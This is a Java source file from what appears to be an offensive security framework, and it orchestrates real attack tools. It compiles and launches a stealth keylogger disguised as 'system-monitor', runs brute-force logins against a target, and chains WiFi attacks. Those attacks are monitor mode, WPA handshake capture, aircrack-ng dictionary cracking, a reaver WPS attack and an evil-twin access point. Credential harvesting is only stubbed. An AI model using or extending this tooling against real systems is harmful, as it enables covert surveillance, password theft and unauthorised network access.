package com.codexraziel.cybersec.workflow;

import com.codexraziel.cybersec.workflow.integrators.WiFiWorkflowIntegrator;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

@Component
@Slf4j
public class RealToolExecutor {
    
    private static final String TOOLS_DIR = "../";
    
    public CompletableFuture<SimpleAttackResult> executeKeylogger() {
        return CompletableFuture.supplyAsync(() -> {
            try {
                String keyloggerPath = TOOLS_DIR + "learning-c-so/linux/system-monitor";
                
                if (!Files.exists(Paths.get(keyloggerPath))) {
                    return compileAndExecuteKeylogger();
                }
                
                ProcessBuilder pb = new ProcessBuilder(keyloggerPath);
                pb.environment().put("STEALTH_MODE", "1");
                Process process = pb.start();
                
                boolean finished = process.waitFor(5, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    return new SimpleAttackResult("keylogger", "Keylogger deployed successfully", true);
                } else {
                    return new SimpleAttackResult("keylogger", "Keylogger deployment timeout", false);
                }
                
            } catch (Exception e) {
                log.error("Keylogger execution failed: {}", e.getMessage());
                return new SimpleAttackResult("keylogger", "Keylogger failed: " + e.getMessage(), false);
            }
        });
    }
    
    private SimpleAttackResult compileAndExecuteKeylogger() {
        try {
            String sourceDir = TOOLS_DIR + "learning-c-so/linux/";
            
            ProcessBuilder compiler = new ProcessBuilder(
                "gcc", "-O3", "-s", "-o", "system-monitor", 
                "linux_stealth_monitor.c", "-lX11", "-lXtst", "-lXext", "-lpthread"
            );
            compiler.directory(new File(sourceDir));
            
            Process compileProcess = compiler.start();
            boolean compiled = compileProcess.waitFor(30, TimeUnit.SECONDS);
            
            if (compiled && compileProcess.exitValue() == 0) {
                ProcessBuilder executor = new ProcessBuilder("./system-monitor");
                executor.directory(new File(sourceDir));
                executor.environment().put("STEALTH_MODE", "1");
                
                Process execProcess = executor.start();
                boolean executed = execProcess.waitFor(5, TimeUnit.SECONDS);
                
                if (executed && execProcess.exitValue() == 0) {
                    return new SimpleAttackResult("keylogger", "Keylogger compiled and deployed", true);
                }
            }
            
            return new SimpleAttackResult("keylogger", "Keylogger compilation failed", false);
            
        } catch (Exception e) {
            log.error("Keylogger compilation failed: {}", e.getMessage());
            return new SimpleAttackResult("keylogger", "Compilation error: " + e.getMessage(), false);
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeBruteForce(String target, String protocol) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                String bruteforceDir = TOOLS_DIR + "redteam-bruteforce/";
                
                // Compile if needed
                if (!Files.exists(Paths.get(bruteforceDir + "bin/redteam-bf"))) {
                    compileBruteForce(bruteforceDir);
                }
                
                ProcessBuilder pb = new ProcessBuilder(
                    "./bin/redteam-bf", protocol.toLowerCase(), 
                    "--target", target, "--threads", "5", "--timeout", "30"
                );
                pb.directory(new File(bruteforceDir));
                
                Process process = pb.start();
                
                // Capture output
                StringBuilder output = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                        if (output.length() > 1000) break; // Limit output
                    }
                }
                
                boolean finished = process.waitFor(60, TimeUnit.SECONDS);
                if (finished) {
                    String result = output.toString();
                    boolean success = result.contains("SUCCESS") || result.contains("FOUND");
                    return new SimpleAttackResult("bruteforce", 
                        success ? "Attack completed: " + result : "Attack failed: " + result, success);
                } else {
                    process.destroyForcibly();
                    return new SimpleAttackResult("bruteforce", "Attack timeout", false);
                }
                
            } catch (Exception e) {
                log.error("BruteForce execution failed: {}", e.getMessage());
                return new SimpleAttackResult("bruteforce", "BruteForce failed: " + e.getMessage(), false);
            }
        });
    }
    
    private void compileBruteForce(String dir) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("./build/build_all.sh");
        pb.directory(new File(dir));
        Process process = pb.start();
        
        if (!process.waitFor(60, TimeUnit.SECONDS) || process.exitValue() != 0) {
            throw new RuntimeException("BruteForce compilation failed");
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiScan(String interfaceName) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                // Try nmcli first (most common)
                ProcessBuilder pb = new ProcessBuilder("nmcli", "dev", "wifi", "list");
                Process process = pb.start();
                
                StringBuilder networks = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 20) {
                        if (line.contains("SSID") || line.trim().isEmpty()) continue;
                        networks.append(line.trim()).append("\n");
                        count++;
                    }
                }
                
                boolean finished = process.waitFor(30, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    String result = networks.toString();
                    int networkCount = result.split("\n").length;
                    return new SimpleAttackResult("wifi_scan", 
                        String.format("Found %d networks:\n%s", networkCount, result), true, result);
                } else {
                    return fallbackWiFiScan(interfaceName);
                }
                
            } catch (Exception e) {
                log.error("WiFi scan failed: {}", e.getMessage());
                return fallbackWiFiScan(interfaceName);
            }
        });
    }
    
    private SimpleAttackResult fallbackWiFiScan(String interfaceName) {
        try {
            // Try iwlist as fallback
            ProcessBuilder pb = new ProcessBuilder("iwlist", interfaceName != null ? interfaceName : "wlan0", "scan");
            Process process = pb.start();
            
            StringBuilder networks = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 50) {
                    if (line.contains("ESSID:") && !line.contains("\"\"")) {
                        String ssid = line.substring(line.indexOf("ESSID:") + 7).replace('"', ' ').trim();
                        networks.append("Network: ").append(ssid).append("\n");
                        count++;
                    }
                }
            }
            
            boolean finished = process.waitFor(30, TimeUnit.SECONDS);
            if (finished && networks.length() > 0) {
                return new SimpleAttackResult("wifi_scan", 
                    "WiFi networks found:\n" + networks.toString(), true, networks.toString());
            } else {
                return new SimpleAttackResult("wifi_scan", "No WiFi networks found or permission denied", false);
            }
            
        } catch (Exception e) {
            log.error("Fallback WiFi scan failed: {}", e.getMessage());
            return new SimpleAttackResult("wifi_scan", "WiFi scan unavailable: " + e.getMessage(), false);
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeNetworkAnalysis(String target) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("nmap", "-sS", "-O", "--top-ports", "100", target);
                Process process = pb.start();
                
                StringBuilder analysis = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("open") || line.contains("OS:") || line.contains("Service")) {
                            analysis.append(line.trim()).append("\n");
                        }
                    }
                }
                
                boolean finished = process.waitFor(120, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    String result = analysis.toString();
                    boolean hasVulns = result.contains("open") && result.length() > 50;
                    return new SimpleAttackResult("network_analysis", 
                        hasVulns ? "Vulnerabilities found:\n" + result : "Target analysis completed", hasVulns, result);
                } else {
                    return new SimpleAttackResult("network_analysis", "Network analysis timeout or failed", false);
                }
                
            } catch (Exception e) {
                log.error("Network analysis failed: {}", e.getMessage());
                return new SimpleAttackResult("network_analysis", "Analysis failed: " + e.getMessage(), false);
            }
        });
    }
    
    // ===== WiFi Attack Methods =====
    
    public CompletableFuture<SimpleAttackResult> setupWiFiMonitorMode(String interfaceName) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Setting up monitor mode on interface: {}", interfaceName);
                
                // Enable monitor mode using airmon-ng
                ProcessBuilder pb = new ProcessBuilder("sudo", "airmon-ng", "start", interfaceName);
                Process process = pb.start();
                
                boolean finished = process.waitFor(30, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    return new SimpleAttackResult("wifi_monitor_mode", 
                        "Monitor mode enabled on " + interfaceName, true);
                } else {
                    return new SimpleAttackResult("wifi_monitor_mode", 
                        "Failed to enable monitor mode", false);
                }
                
            } catch (Exception e) {
                log.error("Monitor mode setup failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_monitor_mode", 
                    "Monitor mode failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiNetworkScan(String interfaceName, Integer duration) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Scanning WiFi networks on {} for {} seconds", interfaceName, duration);
                
                // Create temporary file for scan results
                Path tempFile = Files.createTempFile("wifi_scan_", ".csv");
                String outputPrefix = tempFile.toString().replace(".csv", "");
                
                ProcessBuilder pb = new ProcessBuilder(
                    "sudo", "timeout", duration.toString(),
                    "airodump-ng", "--write", outputPrefix, "--output-format", "csv",
                    "--write-interval", "1", interfaceName
                );
                
                Process process = pb.start();
                boolean finished = process.waitFor(duration + 10, TimeUnit.SECONDS);
                
                // Parse results
                Path csvFile = Paths.get(outputPrefix + "-01.csv");
                int networkCount = 0;
                if (Files.exists(csvFile)) {
                    networkCount = (int) Files.lines(csvFile)
                        .filter(line -> line.contains(":") && line.split(",").length > 10)
                        .count();
                }
                
                return new SimpleAttackResult("wifi_network_scan", 
                    String.format("Found %d networks in %d seconds", networkCount, duration), 
                    networkCount > 0);
                    
            } catch (Exception e) {
                log.error("WiFi network scan failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_network_scan", 
                    "Network scan failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> captureWiFiHandshake(String interfaceName, 
                                                                      String targetSSID, 
                                                                      String targetBSSID, 
                                                                      Integer timeout) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Capturing handshake for {} ({})", targetSSID, targetBSSID);
                
                // Create output file for handshake
                Path outputFile = Files.createTempFile("handshake_" + targetSSID, ".cap");
                
                ProcessBuilder pb = new ProcessBuilder(
                    "sudo", "timeout", timeout.toString(),
                    "airodump-ng", "--write", outputFile.toString().replace(".cap", ""),
                    "--output-format", "cap", "--bssid", targetBSSID, interfaceName
                );
                
                Process process = pb.start();
                boolean finished = process.waitFor(timeout + 10, TimeUnit.SECONDS);
                
                // Check if handshake was captured
                Path capFile = Paths.get(outputFile.toString().replace(".cap", "-01.cap"));
                boolean hasHandshake = Files.exists(capFile) && Files.size(capFile) > 1000;
                
                return new SimpleAttackResult("wifi_handshake_capture", 
                    hasHandshake ? "Handshake captured successfully" : "No handshake captured", 
                    hasHandshake);
                    
            } catch (Exception e) {
                log.error("Handshake capture failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_handshake_capture", 
                    "Handshake capture failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiDictionaryAttack(String handshakeFile, 
                                                                             String wordlistPath, 
                                                                             String targetBSSID) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Executing dictionary attack against {}", targetBSSID);
                
                ProcessBuilder pb = new ProcessBuilder(
                    "aircrack-ng", "-w", wordlistPath, "-b", targetBSSID, handshakeFile
                );
                
                Process process = pb.start();
                
                StringBuilder output = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                        if (line.contains("KEY FOUND!")) {
                            break;
                        }
                    }
                }
                
                boolean finished = process.waitFor(1800, TimeUnit.SECONDS); // 30 minutes max
                String result = output.toString();
                boolean cracked = result.contains("KEY FOUND!");
                
                return new SimpleAttackResult("wifi_dictionary_attack", 
                    cracked ? "Password cracked successfully!" : "Password not found in wordlist", 
                    cracked, result);
                    
            } catch (Exception e) {
                log.error("Dictionary attack failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_dictionary_attack", 
                    "Dictionary attack failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiVulnerabilityAssessment(String interfaceName) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Executing WiFi vulnerability assessment on {}", interfaceName);
                
                // Scan for WPS-enabled networks
                ProcessBuilder pb = new ProcessBuilder(
                    "sudo", "wash", "-i", interfaceName
                );
                
                Process process = pb.start();
                
                StringBuilder vulnResults = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("WPS") || line.contains("PBC")) {
                            vulnResults.append(line.trim()).append("\n");
                        }
                    }
                }
                
                boolean finished = process.waitFor(60, TimeUnit.SECONDS);
                boolean vulnerabilitiesFound = vulnResults.length() > 0;
                
                return new SimpleAttackResult("wifi_vulnerability_assessment", 
                    vulnerabilitiesFound ? "Vulnerabilities found:\n" + vulnResults.toString() : 
                                         "No significant vulnerabilities detected", 
                    vulnerabilitiesFound);
                    
            } catch (Exception e) {
                log.error("Vulnerability assessment failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_vulnerability_assessment", 
                    "Assessment failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiMultiVectorAttack(String interfaceName, 
                                                                              String targetSSID, 
                                                                              String attackMethods) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Executing multi-vector attack on {} using methods: {}", targetSSID, attackMethods);
                
                StringBuilder results = new StringBuilder();
                boolean anySuccess = false;
                
                if (attackMethods.contains("wps")) {
                    // Try WPS attack
                    ProcessBuilder pb = new ProcessBuilder("sudo", "reaver", "-i", interfaceName, "-c", "1");
                    Process process = pb.start();
                    boolean finished = process.waitFor(300, TimeUnit.SECONDS);
                    if (finished && process.exitValue() == 0) {
                        results.append("WPS attack: SUCCESS\n");
                        anySuccess = true;
                    } else {
                        results.append("WPS attack: FAILED\n");
                    }
                }
                
                if (attackMethods.contains("dictionary")) {
                    results.append("Dictionary attack: STARTED (background)\n");
                }
                
                return new SimpleAttackResult("wifi_multi_vector_attack", 
                    results.toString(), anySuccess);
                    
            } catch (Exception e) {
                log.error("Multi-vector attack failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_multi_vector_attack", 
                    "Multi-vector attack failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> setupEvilTwinAP(String interfaceName, 
                                                                 String targetSSID, 
                                                                 String channel) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Setting up Evil Twin AP for {} on channel {}", targetSSID, channel);
                
                // Create hostapd configuration
                Path configFile = Files.createTempFile("evil_twin_", ".conf");
                String config = String.format(
                    "interface=%s\n" +
                    "driver=nl80211\n" +
                    "ssid=%s\n" +
                    "hw_mode=g\n" +
                    "channel=%s\n" +
                    "macaddr_acl=0\n",
                    interfaceName, targetSSID, channel
                );
                Files.write(configFile, config.getBytes());
                
                ProcessBuilder pb = new ProcessBuilder(
                    "sudo", "hostapd", configFile.toString()
                );
                
                Process process = pb.start();
                
                // Give it a few seconds to start
                Thread.sleep(5000);
                
                return new SimpleAttackResult("wifi_evil_twin", 
                    "Evil Twin AP setup initiated for " + targetSSID, true);
                    
            } catch (Exception e) {
                log.error("Evil Twin setup failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_evil_twin", 
                    "Evil Twin setup failed: " + e.getMessage(), false);
            }
        });
    }
    
    public CompletableFuture<SimpleAttackResult> harvestWiFiCredentials(String method) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                log.info("Harvesting WiFi credentials using method: {}", method);
                
                if ("captive_portal".equals(method)) {
                    // Simulate captive portal credential harvesting
                    return new SimpleAttackResult("wifi_credential_harvest", 
                        "Captive portal activated - monitoring for credentials", true);
                } else if ("dhcp_spoofing".equals(method)) {
                    return new SimpleAttackResult("wifi_credential_harvest", 
                        "DHCP spoofing initiated - redirecting traffic", true);
                } else {
                    return new SimpleAttackResult("wifi_credential_harvest", 
                        "Unknown harvest method: " + method, false);
                }
                
            } catch (Exception e) {
                log.error("Credential harvesting failed: {}", e.getMessage());
                return new SimpleAttackResult("wifi_credential_harvest", 
                    "Credential harvesting failed: " + e.getMessage(), false);
            }
        });
    }
}